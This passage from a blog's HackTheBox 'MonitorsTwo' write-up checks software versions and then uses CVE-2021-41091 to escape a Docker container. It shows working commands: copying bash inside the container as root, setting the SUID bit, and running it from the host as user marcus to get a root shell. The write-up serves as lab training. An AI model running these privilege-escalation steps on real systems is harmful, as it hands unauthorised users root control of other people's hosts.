+</span></span><span class="line"><span class="cl"><span class="n">We</span> <span class="n">encourage</span> <span class="n">you</span> <span class="n">to</span> <span class="n">take</span> <span class="n">the</span> <span class="n">necessary</span> <span class="n">steps</span> <span class="n">to</span> <span class="n">address</span> <span class="n">these</span> <span class="n">vulnerabilities</span> <span class="n">promptly</span> <span class="n">to</span> <span class="n">avoid</span> <span class="n">any</span> <span class="n">potential</span> <span class="n">security</span> <span class="n">breaches</span><span class="o">.</span> <span class="n">If</span> <span class="n">you</span> <span class="n">have</span> <span class="n">any</span> <span class="n">questions</span> <span class="ow">or</span> <span class="n">concerns</span><span class="p">,</span> <span class="n">please</span> <span class="k">do</span> <span class="ow">not</span> <span class="n">hesitate</span> <span class="n">to</span> <span class="n">contact</span> <span class="n">our</span> <span class="n">IT</span> <span class="n">department</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Best</span> <span class="n">regards</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Administrator</span>
+</span></span><span class="line"><span class="cl"><span class="n">CISO</span>
+</span></span><span class="line"><span class="cl"><span class="n">Monitor</span> <span class="n">Two</span>
+</span></span><span class="line"><span class="cl"><span class="n">Security</span> <span class="n">Team</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We are detailed 3 CVEs that the box is vulnerable to, at least once this mail letter has been sent. We can do quick checks to see if any of these have been remediated in our box:
+Checking kernel version (CVE-2021-33033)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">marcus@monitorstwo:~$ uname -a
+</span></span><span class="line"><span class="cl">Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Our version was compiled in March 2023, while the CVE is listed with the year 2021. This kernel version will likely not be vulnerable to CVE-2021-33033.</p>
+<p>CVE-2020-25706 is related to cacti version 1.2.13. Recall on the login page as well as the CHANGELOG, we saw our cacti version at the higher 1.2.22, meaning this is not a valid attack route.</p>
+<p>Checking docker version(CVE-2021-41091)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-zed" data-lang="zed"><span class="line"><span class="cl"><span class="n">marcus</span><span class="err">@</span><span class="n">monitorstwo</span><span class="o">:~</span><span class="err">$</span><span class="w"> </span><span class="n">docker</span><span class="w"> </span><span class="n">version</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Client</span><span class="o">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Version</span><span class="o">:</span><span class="w">           </span><span class="err">20</span><span class="p">.</span><span class="err">10</span><span class="p">.</span><span class="err">5</span><span class="o">+</span><span class="n">dfsg1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="n">version</span><span class="o">:</span><span class="w">       </span><span class="err">1</span><span class="p">.</span><span class="err">41</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Go</span><span class="w"> </span><span class="n">version</span><span class="o">:</span><span class="w">        </span><span class="n">go1</span><span class="p">.</span><span class="err">15</span><span class="p">.</span><span class="err">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Git</span><span class="w"> </span><span class="n">commit</span><span class="o">:</span><span class="w">        </span><span class="err">55</span><span class="n">c4c88</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Built</span><span class="o">:</span><span class="w">             </span><span class="n">Wed</span><span class="w"> </span><span class="n">Aug</span><span class="w">  </span><span class="err">4</span><span class="w"> </span><span class="err">19</span><span class="o">:</span><span class="err">55</span><span class="o">:</span><span class="err">57</span><span class="w"> </span><span class="err">2021</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="nn">OS/</span><span class="n">Arch</span><span class="o">:</span><span class="w">           </span><span class="nn">linux/</span><span class="n">amd64</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Context</span><span class="o">:</span><span class="w">           </span><span class="n">default</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Experimental</span><span class="o">:</span><span class="w">      </span><span class="n">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Got</span><span class="w"> </span><span class="kd">permission</span><span class="w"> </span><span class="n">denied</span><span class="w"> </span><span class="n">while</span><span class="w"> </span><span class="n">trying</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Docker</span><span class="w"> </span><span class="n">daemon</span><span class="w"> </span><span class="n">socket</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">unix</span><span class="o">:</span><span class="c1">///var/run/docker.sock: Get &#34;http://%2Fvar%2Frun%2Fdocker.sock/v1.24/version&#34;: dial unix /var/run/docker.sock: connect: permission denied
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>The docker version is old, meaning CVE-2021-41091 is a potential target.</p>
+<h3 id="abusing-cve-2021-41091">Abusing CVE-2021-41091
+</h3><p>We can get more information about CVE-2021-41091 <a class="link" href="https://www.cyberark.com/resources/threat-research-blog/how-docker-made-me-more-capable-and-the-host-less-secure"  target="_blank" rel="noopener"
+    >here, by the person who discovered the bug</a>. This exploit takes advantage that user id&rsquo;s within docker containers and outside the docker containers are shared. So we can create a file with a user inside the docker container, and when accessing the file from outside the docker container, the user id will be retained. This characteristic is normal for linux, but what is not normal is a regular user being able to enter the docker container&rsquo;s filesystem.
+This is ideal for our situation, where we control root from inside the container. The workflow will look something like this:</p>
+<ul>
+<li>As root within docker, create a <code>bash</code> binary with SUID binary set. Any user can run this as root, and get a root bash session.</li>
+<li>As marcus outside the container, find the container location in the file system</li>
+<li>As marcus, access the bash binary. Because this SUID binary was made with user ID 0, it will still be treated as such, meaning the system&rsquo;s root user.</li>
+<li>As marcus, execute the SUID binary and obtain a root shell escaped from the docker session
+Using <code>findmnt</code> to locate docker filesystems</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">marcus</span><span class="err">@</span><span class="n">monitorstwo</span><span class="p">:</span><span class="o">~$</span> <span class="n">findmnt</span>
+</span></span><span class="line"><span class="cl"><span class="n">TARGET</span>                                <span class="n">SOURCE</span>     <span class="n">FSTYPE</span>     <span class="n">OPTIONS</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span>                                     <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">sda2</span>  <span class="n">ext4</span>       <span class="n">rw</span><span class="p">,</span><span class="n">relatime</span>
+</span></span><span class="line"><span class="cl"><span class="err">├─</span><span class="o">/</span><span class="n">sys</span>                                <span class="n">sysfs</span>      <span class="n">sysfs</span>      <span class="n">rw</span><span class="p">,</span><span class="n">nosuid</span><span class="p">,</span><span class="n">nodev</span><span class="p">,</span><span class="n">noexec</span><span class="p">,</span><span class="n">relatime</span>
+</span></span><span class="line"><span class="cl"><span class="err">│</span> <span class="err">├─</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">security</span>              <span class="n">securityfs</span> <span class="n">securityfs</span> <span class="n">rw</span><span class="p">,</span><span class="n">nosuid</span><span class="p">,</span><span class="n">nodev</span><span class="p">,</span><span class="n">noexec</span><span class="p">,</span><span class="n">relatime</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">├─</span><span class="o">/</span><span class="n">run</span>                                <span class="n">tmpfs</span>      <span class="n">tmpfs</span>      <span class="n">rw</span><span class="p">,</span><span class="n">nosuid</span><span class="p">,</span><span class="n">nodev</span><span class="p">,</span><span class="n">noexec</span><span class="p">,</span><span class="n">relatime</span><span class="p">,</span><span class="n">size</span><span class="o">=</span><span class="mi">402608</span><span class="n">k</span><span class="p">,</span><span class="n">mode</span><span class="o">=</span><span class="mi">755</span>
+</span></span><span class="line"><span class="cl"><span class="err">│</span> <span class="err">├─</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">lock</span>                         <span class="n">tmpfs</span>      <span class="n">tmpfs</span>      <span class="n">rw</span><span class="p">,</span><span class="n">nosuid</span><span class="p">,</span><span class="n">nodev</span><span class="p">,</span><span class="n">noexec</span><span class="p">,</span><span class="n">relatime</span><span class="p">,</span><span class="n">size</span><span class="o">=</span><span class="mi">5120</span><span class="n">k</span>
+</span></span><span class="line"><span class="cl"><span class="err">│</span> <span class="err">├─</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">netns</span><span class="o">/</span><span class="mi">2</span><span class="n">a35f1c292bd</span>    <span class="n">nsfs</span><span class="p">[</span><span class="n">net</span><span class="p">:[</span><span class="mi">4026532597</span><span class="p">]]</span>
+</span></span><span class="line"><span class="cl"><span class="err">│</span> <span class="err">│</span>                                              <span class="n">nsfs</span>       <span class="n">rw</span>
+</span></span><span class="line"><span class="cl"><span class="err">│</span> <span class="err">├─</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="mi">1000</span>                    <span class="n">tmpfs</span>      <span class="n">tmpfs</span>      <span class="n">rw</span><span class="p">,</span><span class="n">nosuid</span><span class="p">,</span><span class="n">nodev</span><span class="p">,</span><span class="n">relatime</span><span class="p">,</span><span class="n">size</span><span class="o">=</span><span class="mi">402608</span><span class="n">k</span><span class="p">,</span><span class="n">mode</span><span class="o">=</span><span class="mi">700</span><span class="p">,</span><span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span><span class="n">gid</span><span class="o">=</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="err">│</span> <span class="err">└─</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">netns</span><span class="o">/</span><span class="mi">22</span><span class="n">acd79d4ced</span>    <span class="n">nsfs</span><span class="p">[</span><span class="n">net</span><span class="p">:[</span><span class="mi">4026532659</span><span class="p">]]</span>
+</span></span><span class="line"><span class="cl"><span class="err">│</span>                                                <span class="n">nsfs</span>       <span class="n">rw</span>
+</span></span><span class="line"><span class="cl"><span class="err">├─</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="mi">4</span><span class="n">ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec</span><span class="o">/</span><span class="n">merged</span>
+</span></span><span class="line"><span class="cl"><span class="err">│</span>                                     <span class="n">overlay</span>    <span class="n">overlay</span>    <span class="n">rw</span><span class="p">,</span><span class="n">relatime</span><span class="p">,</span><span class="n">lowerdir</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="mi">756</span><span class="n">FTPFO4AE7H</span>
+</span></span><span class="line"><span class="cl"><span class="err">├─</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">containers</span><span class="o">/</span><span class="n">e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69</span><span class="o">/</span><span class="n">mounts</span><span class="o">/</span><span class="n">shm</span>
+</span></span><span class="line"><span class="cl"><span class="err">│</span>                                     <span class="n">shm</span>        <span class="n">tmpfs</span>      <span class="n">rw</span><span class="p">,</span><span class="n">nosuid</span><span class="p">,</span><span class="n">nodev</span><span class="p">,</span><span class="n">noexec</span><span class="p">,</span><span class="n">relatime</span><span class="p">,</span><span class="n">size</span><span class="o">=</span><span class="mi">65536</span><span class="n">k</span>
+</span></span><span class="line"><span class="cl"><span class="err">├─</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1</span><span class="o">/</span><span class="n">merged</span>
+</span></span><span class="line"><span class="cl"><span class="err">│</span>                                     <span class="n">overlay</span>    <span class="n">overlay</span>    <span class="n">rw</span><span class="p">,</span><span class="n">relatime</span><span class="p">,</span><span class="n">lowerdir</span><span class="o">=/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="mi">4</span><span class="n">Z77R4WYM6X4B</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">containers</span><span class="o">/</span><span class="mi">50</span><span class="n">bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e</span><span class="o">/</span><span class="n">mounts</span><span class="o">/</span><span class="n">shm</span>
+</span></span><span class="line"><span class="cl">                                      <span class="n">shm</span>        <span class="n">tmpfs</span>      <span class="n">rw</span><span class="p">,</span><span class="n">nosuid</span><span class="p">,</span><span class="n">nodev</span><span class="p">,</span><span class="n">noexec</span><span class="p">,</span><span class="n">relatime</span><span class="p">,</span><span class="n">size</span><span class="o">=</span><span class="mi">65536</span><span class="n">k</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There are several docker files it looks like, and we want to know which is ours. To make it a little easier, I placed <code>test</code> in the base directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">root</span><span class="err">@</span><span class="mi">50</span><span class="n">bca5e748b0</span><span class="p">:</span><span class="o">/</span><span class="c1"># touch test</span>
+</span></span><span class="line"><span class="cl"><span class="n">root</span><span class="err">@</span><span class="mi">50</span><span class="n">bca5e748b0</span><span class="p">:</span><span class="o">/</span><span class="c1"># ls</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin</span>   <span class="n">dev</span>            <span class="n">etc</span>   <span class="n">lib</span>    <span class="n">media</span>  <span class="n">opt</span>   <span class="n">root</span>  <span class="n">sbin</span>  <span class="n">sys</span>   <span class="n">tmp</span>  <span class="k">var</span>
+</span></span><span class="line"><span class="cl"><span class="n">boot</span>  <span class="n">entrypoint</span><span class="o">.</span><span class="n">sh</span>  <span class="n">home</span>  <span class="n">lib64</span>  <span class="n">mnt</span>    <span class="n">proc</span>  <span class="n">run</span>   <span class="n">srv</span>   <span class="n">test</span>  <span class="n">usr</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can view it when we access the correct container:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">marcus</span><span class="err">@</span><span class="n">monitorstwo</span><span class="p">:</span><span class="o">~$</span> <span class="n">ls</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1</span><span class="o">/</span><span class="n">merged</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin</span>   <span class="n">dev</span>            <span class="n">etc</span>   <span class="n">lib</span>    <span class="n">media</span>  <span class="n">opt</span>   <span class="n">root</span>  <span class="n">sbin</span>  <span class="n">sys</span>   <span class="n">tmp</span>  <span class="k">var</span>
+</span></span><span class="line"><span class="cl"><span class="n">boot</span>  <span class="n">entrypoint</span><span class="o">.</span><span class="n">sh</span>  <span class="n">home</span>  <span class="n">lib64</span>  <span class="n">mnt</span>    <span class="n">proc</span>  <span class="n">run</span>   <span class="n">srv</span>   <span class="n">test</span>  <span class="n">usr</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Copying and setting SUID on container bash:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@50bca5e748b0:/# cp /bin/bash .    
+</span></span><span class="line"><span class="cl">root@50bca5e748b0:/# chmod +s ./bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Seeing the privileges set from marcus:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">marcus</span><span class="err">@</span><span class="n">monitorstwo</span><span class="p">:</span><span class="o">~$</span> <span class="n">ls</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1</span><span class="o">/</span><span class="n">merged</span> <span class="o">-</span><span class="n">al</span>
+</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="mi">1304</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>    <span class="mi">4096</span> <span class="n">Apr</span> <span class="mi">30</span> <span class="mi">03</span><span class="p">:</span><span class="mi">21</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwx</span><span class="o">-----</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span> <span class="n">root</span>    <span class="mi">4096</span> <span class="n">Apr</span> <span class="mi">30</span> <span class="mi">22</span><span class="p">:</span><span class="mi">55</span> <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">sr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1234376</span> <span class="n">Apr</span> <span class="mi">30</span> <span class="mi">03</span><span class="p">:</span><span class="mi">22</span> <span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Running the SUID bash from marcus</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">marcus</span><span class="err">@</span><span class="n">monitorstwo</span><span class="p">:</span><span class="o">~$</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1</span><span class="o">/</span><span class="n">merged</span><span class="o">/</span><span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
+</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="c1"># whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">root</span>
+</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="c1"># pwd</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">marcus</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see the privilege escalation was successful, we are now root and still outside of the docker container!</p>
+<h2 id="reflection">Reflection
+</h2><p>While this box stayed true to the Easy ranking it achieved, I appreciated seeing a docker exploit such as this. Linux&rsquo;s UID handling and ownership is something I find to be quite interesting, especially in cases like these, where the permissions of a root user on a restricted environment can still be abused outside the scope. The article on CVE-2021-41091 was a blast to read, and I&rsquo;m glad I know more than before!</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/cacti/">Cacti</a>
+        
+            <a href="/tags/remote-code-execution/">Remote Code Execution</a>
+        
+            <a href="/tags/docker/">Docker</a>
+        
+            <a href="/tags/suid/">SUID</a>
+        
+            <a href="/tags/mysql/">MySQL</a>
+        
+            <a href="/tags/hashcat/">Hashcat</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-devvortex/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-devvortex/Devvortex.61ba3466bff8da52f89d2bb6417fb83a_hu4257021157125360887.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Devvortex"
+                        
+                        data-hash="md5-Ybo0Zr/42lL4nSu2QX&#43;4Og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Devvortex</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-surveillance/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-surveillance/Surveillance.8b9fd8fd814572f9ed8f343a005ca93c_hu1936471103572467903.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Surveillance"
+                        
+                        data-hash="md5-i5/Y/YFFcvntjzQ6AFypPA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Surveillance</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-codify/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-codify/Codify.d19bf609d86d6ee490cdde52cb652366_hu5530218627868483871.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Codify"
+                        
+                        data-hash="md5-0Zv2CdhtbuSQzd5Sy2UjZg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Codify</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-analytics/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-analytics/Analytics.b761a640e4211a48e503c55ca0e36d11_hu18004703824071439858.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Analytics"
+                        
+                        data-hash="md5-t2GmQOQhGkjlA8VcoONtEQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Analytics</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-hospital/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-hospital/Hospital.dd28dc96da49df800b952a77639d4857_hu7748615803054416032.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Hospital"
+                        
+                        data-hash="md5-3SjcltpJ34ALlSp3Y51IVw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Hospital</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
